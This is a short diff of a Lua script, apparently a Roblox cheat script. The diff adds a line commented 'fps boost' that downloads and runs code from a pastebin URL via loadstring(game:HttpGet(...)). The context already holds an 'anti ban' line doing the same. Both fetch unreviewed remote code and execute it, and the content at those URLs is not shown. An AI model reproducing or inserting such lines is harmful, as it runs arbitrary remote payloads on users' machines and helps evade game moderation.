@@ -17,4 +17,10 @@ end
 end
 end)
 
+
+--anti ban
 loadstring(game:HttpGet("https://pastebin.com/raw/idT3BQQr"))()
+
+
+--fps boost
+loadstring(game:HttpGet("https://pastebin.com/raw/KkbELfZa"))()
